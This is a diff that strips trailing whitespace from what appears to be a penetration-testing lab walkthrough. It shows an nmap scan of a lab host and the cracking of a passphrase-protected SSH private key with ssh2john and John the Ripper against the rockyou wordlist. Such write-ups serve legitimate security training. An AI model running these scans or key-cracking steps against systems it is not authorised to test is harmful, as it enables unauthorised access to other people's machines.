@@ -5,14 +5,14 @@
 So, let's start with the nmap scan.
 
 ```bash
-kali@kali:nmap -sV -sC 192.168.5.116                                                                                                                          
+kali@kali:nmap -sV -sC 192.168.5.116
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 15:37 +0545
 Nmap scan report for 192.168.5.116 (192.168.5.116)
 Host is up (0.071s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 e9:db:b4:b3:6b:4f:24:b6:18:23:85:2d:65:92:7f:b2 (ECDSA)
 |_  256 15:36:38:eb:3c:37:8e:c6:6f:09:26:c4:d1:0e:3a:ae (ED25519)
 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
@@ -69,14 +69,14 @@ Since, the key is passphrase protected, brute force it using john.
 ```bash
 kali@kali:ssh2john id_rsa > hash.txt
 
-kali@kali:john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                 
+kali@kali:john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
 Cost 2 (iteration count) is 16 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-p...3          (id_rsa)     
+p...3          (id_rsa)
 1g 0:00:13:02 DONE (2026-02-09 15:56) 0.001277g/s 27.27p/s 27.27c/s 27.27C/s polo123..mamipapi
 Use the "--show" option to display all of the cracked passwords reliably
 ```
